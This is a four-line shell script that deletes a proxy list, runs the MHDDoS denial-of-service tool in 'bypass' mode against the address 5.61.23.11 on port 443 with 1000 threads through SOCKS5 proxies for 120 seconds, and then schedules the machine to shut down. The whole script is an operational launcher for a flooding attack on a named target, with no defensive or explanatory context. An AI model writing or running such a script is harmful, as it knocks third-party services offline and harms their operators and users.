#!/bin/sh
rm /home/ubuntu/mhddos/files/proxies/socks5.txt
python3 /home/ubuntu/mhddos/start.py bypass 5.61.23.11:443 5 1000 socks5.txt 100000 120
sudo shutdown -P +3 &
